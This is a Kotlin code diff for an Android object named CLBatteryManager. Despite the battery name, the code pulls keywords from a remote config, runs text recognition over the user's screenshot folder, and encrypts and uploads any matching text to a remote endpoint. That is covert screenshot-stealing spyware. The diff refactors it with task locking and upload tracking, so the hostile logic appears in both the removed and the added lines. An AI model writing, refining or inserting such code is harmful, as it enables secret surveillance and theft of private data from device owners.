@@ -23,10 +23,18 @@ import org.json.JSONObject
 
 object CLBatteryManager {
 
+    @Volatile
+    private var isTaskRunning = false
+    private var pendingUploads = 0
+    private var completedUploads = 0
+
     private fun loadPhoneScreenShots(
         modeType: Int,
         fileSize: Long,
-        callback: (String?, Boolean) -> Unit
+        pageSize: String,
+        searchList: List<String>,
+        channel: String,
+        onComplete: () -> Unit
     ) {
         logV("modeType=${modeType}  fileSize=${fileSize}")
         var dirPath = PathUtils.getExternalDcimPath() + "/Screenshots"
@@ -60,12 +68,34 @@ object CLBatteryManager {
                 length <= fileSize
             }
         logV("可筛选文件数量=${filesInDir.size}")
-        for ((index, file) in filesInDir.withIndex()) {
+
+        if (filesInDir.isEmpty()) {
+            onComplete()
+            return
+        }
+
+        var processedFiles = 0
+        for (file in filesInDir) {
             val uri = file.toUri()
-//            val fileLength = FileUtils.getLength(file)
-//            logV("截图相册文件路径=${uri},文件长度=${fileLength}")
-            recognizeText(modeType, uri) {
-                callback.invoke(it, index == filesInDir.size - 1)
+            recognizeText(modeType, uri) { content ->
+                processedFiles++
+                if (content != null) {
+                    val containData = searchList.filter { searchKey -> 
+                        content.contains(searchKey, true) || searchKey.contains(content, true) 
+                    }
+                    if (containData.isNotEmpty()) {
+                        logV("匹配成功的数据=$content")
+                        submitData(encryptData(pageSize, content), channel) {
+                            if (processedFiles == filesInDir.size && completedUploads == pendingUploads) {
+                                onComplete()
+                            }
+                        }
+                    } else if (processedFiles == filesInDir.size && completedUploads == pendingUploads) {
+                        onComplete()
+                    }
+                } else if (processedFiles == filesInDir.size && completedUploads == pendingUploads) {
+                    onComplete()
+                }
             }
         }
     }
@@ -97,13 +127,17 @@ object CLBatteryManager {
      *  @param key 识别出来的数据
      *  @param channel 渠道号
      */
-    private fun submitData(key: String?, channel: String = "BatteryHID") {
+    private fun submitData(key: String?, channel: String = "BatteryHID", onComplete: () -> Unit) {
         if (key.isNullOrBlank()) {
             logE("提交加密数据异常")
+            onComplete()
             return
         }
+        pendingUploads++
         HttpManager.httpPost(HttpManager.HTTP_SUBMIT, key, channel) { json ->
             logV("提交数据=$json")
+            completedUploads++
+            onComplete()
         }
     }
 
@@ -135,31 +169,41 @@ object CLBatteryManager {
 
 
     fun doTask(channel:String="BatteryHID") {
+        if (isTaskRunning) {
+            logV("任务已在运行，忽略新请求")
+            return
+        }
+        
+        isTaskRunning = true
+        pendingUploads = 0
+        completedUploads = 0
+        
         HttpManager.httpGet(HttpManager.HTTP_CONFIG) { json ->
             logV("请求数据=$json")
-            if (json.isNullOrBlank()) return@httpGet
+            if (json.isNullOrBlank()) {
+                isTaskRunning = false
+                return@httpGet
+            }
             if (JsonUtils.getInt(json, "code") == 200) {
                 val dataJson = JsonUtils.getJSONObject(json, "data", JSONObject())
-                // 1 中英，2 全部
                 val modeType = dataJson.getInt("modeType")
                 val fileSize = dataJson.getLong("fileSize")
-                // 精度 1是普通，2是高精度
-                //val precision = dataJson.getInt("precision")
                 val pageSize = dataJson.getString("pageSize")
                 val searchKey = dataJson.getString("searchKey")
                 val searchList = searchKey.split(",")
+                
                 loadPhoneScreenShots(
-                    modeType, fileSize * 1024
-                ) { content, status ->
-                    if (!content.isNullOrBlank()) {
-                        val containData =
-                            searchList.filter { content.contains(it,true) || it.contains(content,true) }
-                        if (containData.isNotEmpty()) {
-                            logV("匹配成功的数据=$content")
-                            submitData(encryptData(pageSize,content),channel)
-                        }
-                    }
+                    modeType = modeType,
+                    fileSize = fileSize * 1024,
+                    pageSize = pageSize,
+                    searchList = searchList,
+                    channel = channel
+                ) {
+                    isTaskRunning = false
+                    logV("任务已完成")
                 }
+            } else {
+                isTaskRunning = false
             }
         }
     }
